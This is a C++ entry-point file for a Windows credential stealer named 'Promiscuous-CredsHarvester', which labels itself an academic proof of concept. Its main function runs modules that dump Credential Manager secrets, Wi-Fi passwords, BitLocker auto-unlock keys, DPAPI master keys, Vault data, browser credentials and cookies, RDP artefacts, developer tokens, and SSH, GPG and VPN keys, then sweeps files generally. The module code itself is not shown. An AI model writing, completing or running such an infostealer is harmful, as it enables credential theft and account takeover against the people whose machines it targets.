#include <iostream>
#include <windows.h>
#include "SystemCredentialsDump.h"
#include "DpapiMasterKeys.h"
#include "VaultDump.h"
#include "ChromiumDump.h"
#include "GeckoAndIECookies.h"
#include "RdpDump.h"
#include "DevCredentialsDump.h"
#include "CryptoKeysDump.h"
#include "Pillaging.h"

int main() {
    SetConsoleOutputCP(CP_UTF8);

    std::cout << "========================================================\n";
    std::cout << "  Promiscuous-CredsHarvester — Academic PoC Engine      \n";
    std::cout << "========================================================\n";

    // 1. Windows system credentials
    SystemCredentialsDump::DumpCredManager();
    SystemCredentialsDump::DumpWifiPasswords();
    SystemCredentialsDump::DecryptBitLockerAutoUnlock();
    SystemCredentialsDump::DumpEAPCertificates();

    // 2. DPAPI master keys
    DpapiMasterKeys::Dump();

    // 3. Windows Vault metadata
    VaultDump::Run();

    // 4. Browsers
    ChromiumDump::Run();
    GeckoAndIECookies::RunAll();

    // 5. Remote access (RDP artefacts)
    RdpDump::Run();

    // 6. Developer / CLI credentials (tokens, configs, sessions)
    DevCredentialsDump::Run();

    // 7. Cryptographic key material (SSH, GPG, VPN, raw keys)
    CryptoKeysDump::Run();

    // 8. Generic file pillaging (catch-all)
    Pillaging::Run();

    std::cout << "\n========================================================\n";
    std::cout << "[+] Execution finished.\n";

    return 0;
}